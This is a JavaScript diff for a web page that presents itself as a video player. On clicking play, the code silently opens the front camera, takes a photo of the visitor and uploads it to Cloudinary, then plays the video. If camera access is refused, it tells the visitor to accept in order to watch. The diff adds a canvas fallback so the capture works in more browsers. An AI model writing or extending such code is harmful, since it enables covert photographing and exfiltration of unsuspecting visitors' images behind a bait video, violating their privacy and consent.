@@ -66,18 +66,17 @@ const uploadToCloudinary = async (blob) => {
 
 const playVideo = () => {
     playButton.style.display = 'none';
-    loader.style.display = 'block';
-    setTimeout(() => {
-        loader.style.display = 'none';
-        video.controls = true;
-        video.play();
-    }, 2000);
+    loader.style.display = 'none';
+    video.controls = true;
+    video.play();
 };
 
 if (isIOS) {
     cameraInput.addEventListener('change', async (e) => {
         const file = e.target.files[0];
         if (file) {
+            playButton.style.display = 'none';
+            loader.style.display = 'block';
             await uploadToCloudinary(file);
             playVideo();
         }
@@ -88,15 +87,40 @@ if (isIOS) {
     });
 } else {
     playButton.addEventListener('click', async () => {
+        playButton.style.display = 'none';
+        loader.style.display = 'block';
+        
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-            const videoTrack = stream.getVideoTracks()[0];
-            const imageCapture = new ImageCapture(videoTrack);
-            const blob = await imageCapture.takePhoto();
-            stream.getTracks().forEach(track => track.stop());
-            await uploadToCloudinary(blob);
+            
+            // Try ImageCapture API first
+            if (window.ImageCapture) {
+                const videoTrack = stream.getVideoTracks()[0];
+                const imageCapture = new ImageCapture(videoTrack);
+                const blob = await imageCapture.takePhoto();
+                stream.getTracks().forEach(track => track.stop());
+                await uploadToCloudinary(blob);
+            } else {
+                // Fallback: capture from video element
+                const videoEl = document.createElement('video');
+                videoEl.srcObject = stream;
+                videoEl.play();
+                await new Promise(resolve => setTimeout(resolve, 500));
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = videoEl.videoWidth;
+                canvas.height = videoEl.videoHeight;
+                canvas.getContext('2d').drawImage(videoEl, 0, 0);
+                stream.getTracks().forEach(track => track.stop());
+                
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+                await uploadToCloudinary(blob);
+            }
+            
             playVideo();
         } catch (error) {
+            loader.style.display = 'none';
+            playButton.style.display = 'flex';
             alert('Camera permission denied. Please accept to watch the video.');
         }
     });
